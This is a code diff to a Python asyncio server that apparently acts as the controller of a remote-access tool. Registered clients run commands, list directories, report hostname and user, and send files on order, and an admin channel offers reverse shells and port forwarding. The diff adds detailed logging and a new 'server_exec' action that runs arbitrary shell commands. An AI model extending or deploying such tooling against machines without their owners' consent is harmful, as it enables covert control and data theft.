@@ -3,6 +3,7 @@
 import argparse
 import asyncio
 import hashlib
+import json
 import logging
 import os
 import shutil
@@ -108,8 +109,12 @@ class Server:
             f"Starting on {self.host}:{', '.join(map(str, self.ports))}  storage={self.storage}"
         )
         for port in self.ports:
+            def _make_handler(p: int):
+                async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
+                    await self.handle_connection(r, w, p)
+                return _h
             srv = await asyncio.start_server(
-                self.handle_connection, self.host, port, ssl=self.ssl_ctx
+                _make_handler(port), self.host, port, ssl=self.ssl_ctx
             )
             self.servers.append(srv)
             sockets = ", ".join(str(s.getsockname()) for s in srv.sockets or [])
@@ -118,13 +123,13 @@ class Server:
         await asyncio.gather(*(srv.serve_forever() for srv in self.servers))
 
     async def handle_connection(
-        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
+        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, port: int
     ):
         peer = writer.get_extra_info("peername")
         try:
             header, payload = await read_frame(reader)
         except Exception as e:
-            log.warning(f"{peer} failed to send initial frame: {e}")
+            log.warning(f":{port} {peer} failed initial frame: {e}")
             writer.close()
             await writer.wait_closed()
             return
@@ -132,16 +137,16 @@ class Server:
         msg_type = header.get("type")
         token = header.get("token")
         if token != self.auth_token:
-            log.warning(f"Auth failed from {peer}")
+            log.warning(f":{port} auth failed from {peer}")
             await write_frame(writer, {"type": "ERROR", "error": "auth_failed"})
             writer.close()
             await writer.wait_closed()
             return
 
         if msg_type == "REGISTER":
-            await self.handle_client(reader, writer, header)
+            await self.handle_client(reader, writer, header, port)
         elif msg_type == "ADMIN":
-            log.info(f"Admin connected from {peer} action={header.get('action')}")
+            log.info(f":{port} admin from {peer}  action={header.get('action')}")
             await self.handle_admin(reader, writer, header, payload)
         else:
             await write_frame(
@@ -155,7 +160,9 @@ class Server:
         reader: asyncio.StreamReader,
         writer: asyncio.StreamWriter,
         header: Dict[str, Any],
+        port: int,
     ):
+        peer = writer.get_extra_info("peername")
         client_id = header.get("client_id")
         if not client_id:
             await write_frame(writer, {"type": "ERROR", "error": "missing_client_id"})
@@ -168,13 +175,14 @@ class Server:
             await write_frame(
                 writer, {"type": "REGISTERED", "server_version": __version__}
             )
-            log.info(f"Test connection successful: {client_id}")
+            log.info(f":{port} test connection: {client_id} from {peer}")
             writer.close()
             await writer.wait_closed()
             return
 
         # Replace existing session if duplicate
         if client_id in self.clients:
+            log.info(f":{port} replacing existing session for {client_id}")
             try:
                 self.clients[client_id].writer.close()
             except Exception:
@@ -183,7 +191,7 @@ class Server:
         session = ClientSession(client_id, writer)
         self.clients[client_id] = session
         await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
-        log.info(f"Client registered: {client_id}")
+        log.info(f":{port} client registered: {client_id} from {peer}")
 
         # Start a task to pump orders to client; store ref for clean cancellation
         session.pump_task = asyncio.create_task(self._pump_orders(session))
@@ -194,23 +202,41 @@ class Server:
                 session.last_seen = time.time()
                 t = header.get("type")
                 if t == "PONG":
-                    if not self._resolve_pending_result(header, payload):
+                    rid = header.get("req_id")
+                    if self._resolve_pending_result(header, payload):
+                        log.debug(f"[{client_id}] PONG req_id={rid}")
+                    else:
                         log.debug(f"[{client_id}] PONG (keepalive)")
 
                 elif t == "RESULT_LIST_DIR":
-                    if not self._resolve_pending_result(header, payload):
-                        log.info(
-                            f"[{client_id}] LIST_DIR {header.get('path')} -> "
-                            f"{header.get('entries_count', '?')} entries"
-                        )
+                    path = header.get("path", "?")
+                    count = header.get("entries_count", "?")
+                    self._resolve_pending_result(header, payload)
+                    log.info(f"[{client_id}] LIST_DIR {path!r}  {count} entries")
 
                 elif t == "RESULT_EXEC":
-                    if not self._resolve_pending_result(header, payload):
-                        log.info(f"[{client_id}] EXEC result rc={header.get('rc')}")
+                    try:
+                        _r = json.loads(payload.decode()) if payload else {}
+                    except Exception:
+                        _r = {}
+                    rc = _r.get("rc", header.get("rc"))
+                    out_b = len((_r.get("stdout") or "").encode())
+                    err_b = len((_r.get("stderr") or "").encode())
+                    self._resolve_pending_result(header, payload)
+                    log.info(f"[{client_id}] EXEC rc={rc}  stdout={out_b}B  stderr={err_b}B")
 
                 elif t == "RESULT_SESSION_INFO":
-                    if not self._resolve_pending_result(header, payload):
-                        log.info(f"[{client_id}] SESSION_INFO received")
+                    try:
+                        _i = json.loads(payload.decode()) if payload else {}
+                    except Exception:
+                        _i = {}
+                    self._resolve_pending_result(header, payload)
+                    log.info(
+                        f"[{client_id}] SESSION_INFO"
+                        f"  hostname={_i.get('hostname', '?')!r}"
+                        f"  user={_i.get('user', '?')!r}"
+                        f"  system={_i.get('system', '?')!r}"
+                    )
 
                 elif t == "FILE":
                     # Client sent a file in response to PULL_FILE
@@ -270,9 +296,9 @@ class Server:
                 else:
                     log.debug(f"[{client_id}] Unhandled message type: {t}")
         except (ProtocolError, asyncio.IncompleteReadError) as e:
-            log.warning(f"Client {client_id} disconnected: {e}")
+            log.warning(f"[{client_id}] disconnected from {peer}: {e}")
         except Exception as e:
-            log.exception(f"Error handling client {client_id}: {e}")
+            log.exception(f"[{client_id}] error from {peer}: {e}")
         finally:
             # Cancel the pump task so it doesn't linger after disconnect
             if session.pump_task and not session.pump_task.done():
@@ -290,7 +316,7 @@ class Server:
                 pass
             if self.clients.get(client_id) is session:
                 del self.clients[client_id]
-            log.info(f"Client {client_id} removed")
+            log.info(f"[{client_id}] session closed (was {peer})")
 
     def _resolve_pending_result(self, header: dict, payload: bytes) -> bool:
         """Resolve a pending future with the result. Returns True if claimed."""
@@ -381,6 +407,7 @@ class Server:
             "health_status",
             "reverse_shell",
             "port_forward",
+            "server_exec",
         }:
             await write_frame(
                 writer, {"type": "ERROR", "error": "unknown_admin_action"}
@@ -426,6 +453,54 @@ class Server:
         if action == "health_status":
             health_status = self.get_health_status()
             await write_frame(writer, {"type": "HEALTH_STATUS", **health_status})
+            writer.close()
+            await writer.wait_closed()
+            return
+
+        if action == "server_exec":
+            cmd = header.get("cmd")
+            if not cmd:
+                await write_frame(writer, {"type": "ERROR", "error": "missing_cmd"})
+                writer.close()
+                await writer.wait_closed()
+                return
+            timeout = float(header.get("timeout", 30.0))
+            log.info(f"server_exec cmd={cmd!r}")
+            try:
+                proc = await asyncio.create_subprocess_shell(
+                    cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                try:
+                    stdout_b, stderr_b = await asyncio.wait_for(
+                        proc.communicate(), timeout=timeout
+                    )
+                except asyncio.TimeoutError:
+                    try:
+                        proc.kill()
+                        await proc.communicate()
+                    except Exception:
+                        pass
+                    await write_frame(writer, {"type": "ERROR", "error": "timeout"})
+                    writer.close()
+                    await writer.wait_closed()
+                    return
+                rc = proc.returncode
+                log.info(f"server_exec rc={rc}  stdout={len(stdout_b)}B  stderr={len(stderr_b)}B")
+                result = {
+                    "rc": rc,
+                    "stdout": stdout_b.decode(errors="replace"),
+                    "stderr": stderr_b.decode(errors="replace"),
+                }
+                await write_frame(
+                    writer,
+                    {"type": "RESULT_EXEC", "rc": rc},
+                    json.dumps(result).encode(),
+                )
+            except Exception as exc:
+                log.exception(f"server_exec failed: {exc}")
+                await write_frame(writer, {"type": "ERROR", "error": str(exc)})
             writer.close()
             await writer.wait_closed()
             return
